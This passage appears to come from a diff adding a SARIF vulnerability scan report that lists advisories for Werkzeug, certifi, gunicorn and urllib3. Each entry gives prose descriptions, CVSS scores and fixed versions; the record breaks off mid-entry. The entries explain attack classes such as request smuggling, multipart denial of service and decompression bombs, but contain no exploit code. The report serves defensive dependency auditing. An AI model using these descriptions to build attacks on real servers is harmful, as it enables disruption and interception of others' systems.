+                "markdown": "**Vulnerability CVE-2023-25577**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|Werkzeug|2.2.3|[CVE-2023-25577](https://avd.aquasec.com/nvd/cve-2023-25577)|\n\nWerkzeug is a comprehensive WSGI web application library. Prior to version 2.2.3, Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers. Version 2.2.3 contains a patch for this issue."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-34069",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-werkzeug: user may execute code on a developer's machine"
+              },
+              "fullDescription": {
+                "text": "Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2024-34069",
+              "help": {
+                "text": "Vulnerability CVE-2024-34069\nSeverity: HIGH\nPackage: Werkzeug\nFixed Version: 3.0.3\nLink: [CVE-2024-34069](https://avd.aquasec.com/nvd/cve-2024-34069)\nWerkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",
+                "markdown": "**Vulnerability CVE-2024-34069**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|Werkzeug|3.0.3|[CVE-2024-34069](https://avd.aquasec.com/nvd/cve-2024-34069)|\n\nWerkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-6q48-6c7w-9gw2",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "certifi bundles emSign root CAs with compromised intermediate CA keys"
+              },
+              "fullDescription": {
+                "text": "Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. \n\nAn attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.\n\nCertifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-6q48-6c7w-9gw2",
+              "help": {
+                "text": "Vulnerability GHSA-6q48-6c7w-9gw2\nSeverity: CRITICAL\nPackage: certifi\nFixed Version: 2026.10.18\nLink: [GHSA-6q48-6c7w-9gw2](https://github.com/advisories/GHSA-6q48-6c7w-9gw2)\nCertifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. \n\nAn attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.\n\nCertifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.",
+                "markdown": "**Vulnerability GHSA-6q48-6c7w-9gw2**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|CRITICAL|certifi|2026.10.18|[GHSA-6q48-6c7w-9gw2](https://github.com/advisories/GHSA-6q48-6c7w-9gw2)|\n\nCertifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. \n\nAn attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.\n\nCertifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi."
+              },
+              "properties": {
+                "cvssv40_baseScore": 9.1,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "9.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-37920",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-certifi: Removal of e-Tugra root certificate"
+              },
+              "fullDescription": {
+                "text": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi prior to version 2023.07.22 recognizes \"e-Tugra\" root certificates. e-Tugra's root certificates were subject to an investigation prompted by reporting of security issues in their systems. Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2023-37920",
+              "help": {
+                "text": "Vulnerability CVE-2023-37920\nSeverity: HIGH\nPackage: certifi\nFixed Version: 2023.7.22\nLink: [CVE-2023-37920](https://avd.aquasec.com/nvd/cve-2023-37920)\nCertifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi prior to version 2023.07.22 recognizes \"e-Tugra\" root certificates. e-Tugra's root certificates were subject to an investigation prompted by reporting of security issues in their systems. Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store.",
+                "markdown": "**Vulnerability CVE-2023-37920**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|certifi|2023.7.22|[CVE-2023-37920](https://avd.aquasec.com/nvd/cve-2023-37920)|\n\nCertifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi prior to version 2023.07.22 recognizes \"e-Tugra\" root certificates. e-Tugra's root certificates were subject to an investigation prompted by reporting of security issues in their systems. Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-1135",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-gunicorn: HTTP Request Smuggling due to improper validation of Transfer-Encoding headers"
+              },
+              "fullDescription": {
+                "text": "Gunicorn fails to properly validate Transfer-Encoding headers, leading to HTTP Request Smuggling (HRS) vulnerabilities. By crafting requests with conflicting Transfer-Encoding headers, attackers can bypass security restrictions and access restricted endpoints. This issue is due to Gunicorn's handling of Transfer-Encoding headers, where it incorrectly processes requests with multiple, conflicting Transfer-Encoding headers, treating them as chunked regardless of the final encoding specified. This vulnerability allows for a range of attacks including cache poisoning, session manipulation, and data exposure."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2024-1135",
+              "help": {
+                "text": "Vulnerability CVE-2024-1135\nSeverity: HIGH\nPackage: gunicorn\nFixed Version: 22.0.0\nLink: [CVE-2024-1135](https://avd.aquasec.com/nvd/cve-2024-1135)\nGunicorn fails to properly validate Transfer-Encoding headers, leading to HTTP Request Smuggling (HRS) vulnerabilities. By crafting requests with conflicting Transfer-Encoding headers, attackers can bypass security restrictions and access restricted endpoints. This issue is due to Gunicorn's handling of Transfer-Encoding headers, where it incorrectly processes requests with multiple, conflicting Transfer-Encoding headers, treating them as chunked regardless of the final encoding specified. This vulnerability allows for a range of attacks including cache poisoning, session manipulation, and data exposure.",
+                "markdown": "**Vulnerability CVE-2024-1135**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|gunicorn|22.0.0|[CVE-2024-1135](https://avd.aquasec.com/nvd/cve-2024-1135)|\n\nGunicorn fails to properly validate Transfer-Encoding headers, leading to HTTP Request Smuggling (HRS) vulnerabilities. By crafting requests with conflicting Transfer-Encoding headers, attackers can bypass security restrictions and access restricted endpoints. This issue is due to Gunicorn's handling of Transfer-Encoding headers, where it incorrectly processes requests with multiple, conflicting Transfer-Encoding headers, treating them as chunked regardless of the final encoding specified. This vulnerability allows for a range of attacks including cache poisoning, session manipulation, and data exposure."
+              },
+              "properties": {
+                "cvssv3_baseScore": 8.2,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "8.2",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-6827",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "gunicorn: HTTP Request Smuggling in benoitc/gunicorn"
+              },
+              "fullDescription": {
+                "text": "Gunicorn version 21.2.0 does not properly validate the value of the 'Transfer-Encoding' header as specified in the RFC standards, which leads to the default fallback method of 'Content-Length,' making it vulnerable to TE.CL request smuggling. This vulnerability can lead to cache poisoning, data exposure, session manipulation, SSRF, XSS, DoS, data integrity compromise, security bypass, information leakage, and business logic abuse."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2024-6827",
+              "help": {
+                "text": "Vulnerability CVE-2024-6827\nSeverity: HIGH\nPackage: gunicorn\nFixed Version: 22.0.0\nLink: [CVE-2024-6827](https://avd.aquasec.com/nvd/cve-2024-6827)\nGunicorn version 21.2.0 does not properly validate the value of the 'Transfer-Encoding' header as specified in the RFC standards, which leads to the default fallback method of 'Content-Length,' making it vulnerable to TE.CL request smuggling. This vulnerability can lead to cache poisoning, data exposure, session manipulation, SSRF, XSS, DoS, data integrity compromise, security bypass, information leakage, and business logic abuse.",
+                "markdown": "**Vulnerability CVE-2024-6827**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|gunicorn|22.0.0|[CVE-2024-6827](https://avd.aquasec.com/nvd/cve-2024-6827)|\n\nGunicorn version 21.2.0 does not properly validate the value of the 'Transfer-Encoding' header as specified in the RFC standards, which leads to the default fallback method of 'Content-Length,' making it vulnerable to TE.CL request smuggling. This vulnerability can lead to cache poisoning, data exposure, session manipulation, SSRF, XSS, DoS, data integrity compromise, security bypass, information leakage, and business logic abuse."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2021-33503",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-urllib3: ReDoS in the parsing of authority part of URL"
+              },
+              "fullDescription": {
+                "text": "An issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2021-33503",
+              "help": {
+                "text": "Vulnerability CVE-2021-33503\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 1.26.5\nLink: [CVE-2021-33503](https://avd.aquasec.com/nvd/cve-2021-33503)\nAn issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect.",
+                "markdown": "**Vulnerability CVE-2021-33503**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|1.26.5|[CVE-2021-33503](https://avd.aquasec.com/nvd/cve-2021-33503)|\n\nAn issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "cvssv40_baseScore": 8.7,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-43804",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-urllib3: Cookie request header isn't stripped during cross-origin redirects"
+              },
+              "fullDescription": {
+                "text": "urllib3 is a user-friendly HTTP client library for Python. urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly. This issue has been patched in urllib3 version 1.26.17 or 2.0.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2023-43804",
+              "help": {
+                "text": "Vulnerability CVE-2023-43804\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.0.6, 1.26.17\nLink: [CVE-2023-43804](https://avd.aquasec.com/nvd/cve-2023-43804)\nurllib3 is a user-friendly HTTP client library for Python. urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly. This issue has been patched in urllib3 version 1.26.17 or 2.0.5.",
+                "markdown": "**Vulnerability CVE-2023-43804**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.0.6, 1.26.17|[CVE-2023-43804](https://avd.aquasec.com/nvd/cve-2023-43804)|\n\nurllib3 is a user-friendly HTTP client library for Python. urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly. This issue has been patched in urllib3 version 1.26.17 or 2.0.5."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.9,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N",
+                "cvssv40_baseScore": 7.4,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "5.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-66418",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3: Unbounded decompression chain leads to resource exhaustion"
+              },
+              "fullDescription": {
+                "text": "urllib3 is a user-friendly HTTP client library for Python. Starting in version 1.24 and prior to 2.6.0, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data. This vulnerability is fixed in 2.6.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-66418",
+              "help": {
+                "text": "Vulnerability CVE-2025-66418\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.6.0\nLink: [CVE-2025-66418](https://avd.aquasec.com/nvd/cve-2025-66418)\nurllib3 is a user-friendly HTTP client library for Python. Starting in version 1.24 and prior to 2.6.0, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data. This vulnerability is fixed in 2.6.0.",
+                "markdown": "**Vulnerability CVE-2025-66418**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.6.0|[CVE-2025-66418](https://avd.aquasec.com/nvd/cve-2025-66418)|\n\nurllib3 is a user-friendly HTTP client library for Python. Starting in version 1.24 and prior to 2.6.0, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data. This vulnerability is fixed in 2.6.0."
+              },
+              "properties": {
+                "cvssv40_baseScore": 8.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-66471",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3 Streaming API improperly handles highly compressed data"
+              },
+              "fullDescription": {
+                "text": "urllib3 is a user-friendly HTTP client library for Python. Starting in version 1.0 and prior to 2.6.0, the Streaming API improperly handles highly compressed data. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP Content-Encoding header (e.g., gzip, deflate, br, or zstd). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation. The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-66471",
+              "help": {
+                "text": "Vulnerability CVE-2025-66471\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.6.0\nLink: [CVE-2025-66471](https://avd.aquasec.com/nvd/cve-2025-66471)\nurllib3 is a user-friendly HTTP client library for Python. Starting in version 1.0 and prior to 2.6.0, the Streaming API improperly handles highly compressed data. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP Content-Encoding header (e.g., gzip, deflate, br, or zstd). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation. The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data.",
+                "markdown": "**Vulnerability CVE-2025-66471**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.6.0|[CVE-2025-66471](https://avd.aquasec.com/nvd/cve-2025-66471)|\n\nurllib3 is a user-friendly HTTP client library for Python. Starting in version 1.0 and prior to 2.6.0, the Streaming API improperly handles highly compressed data. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP Content-Encoding header (e.g., gzip, deflate, br, or zstd). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation. The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data."
+              },
+              "properties": {
+                "cvssv40_baseScore": 8.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-21441",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3 vulnerable to decompression-bomb safeguard bypass when following HTTP redirects (streaming API)"
+              },
+              "fullDescription": {
+                "text": "urllib3 is an HTTP client library for Python. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption. Starting in version 1.22 and prior to version 2.6.3, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client. Applications and libraries are affected when they stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects. Users should upgrade to at least urllib3 v2.6.3, in which the library does not decode content of redirect responses when `preload_content=False`. If upgrading is not immediately possible, disable redirects by setting `redirect=False` for requests to untrusted source."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-21441",
+              "help": {
+                "text": "Vulnerability CVE-2026-21441\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.6.3\nLink: [CVE-2026-21441](https://avd.aquasec.com/nvd/cve-2026-21441)\nurllib3 is an HTTP client library for Python. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption. Starting in version 1.22 and prior to version 2.6.3, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client. Applications and libraries are affected when they stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects. Users should upgrade to at least urllib3 v2.6.3, in which the library does not decode content of redirect responses when `preload_content=False`. If upgrading is not immediately possible, disable redirects by setting `redirect=False` for requests to untrusted source.",
+                "markdown": "**Vulnerability CVE-2026-21441**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.6.3|[CVE-2026-21441](https://avd.aquasec.com/nvd/cve-2026-21441)|\n\nurllib3 is an HTTP client library for Python. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption. Starting in version 1.22 and prior to version 2.6.3, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client. Applications and libraries are affected when they stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects. Users should upgrade to at least urllib3 v2.6.3, in which the library does not decode content of redirect responses when `preload_content=False`. If upgrading is not immediately possible, disable redirects by setting `redirect=False` for requests to untrusted source."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "cvssv40_baseScore": 8.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44431",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3: Information disclosure via cross-origin redirects forwarding sensitive headers"
+              },
+              "fullDescription": {
+                "text": "urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44431",
+              "help": {
+                "text": "Vulnerability CVE-2026-44431\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.7.0\nLink: [CVE-2026-44431](https://avd.aquasec.com/nvd/cve-2026-44431)\nurllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.",
+                "markdown": "**Vulnerability CVE-2026-44431**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.7.0|[CVE-2026-44431](https://avd.aquasec.com/nvd/cve-2026-44431)|\n\nurllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.3,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                "cvssv40_baseScore": 8.2,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-97687",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3: Traffic interception via HTTPS proxy TLS configuration override"
+              },
+              "fullDescription": {
+                "text": "urllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-97687",
+              "help": {
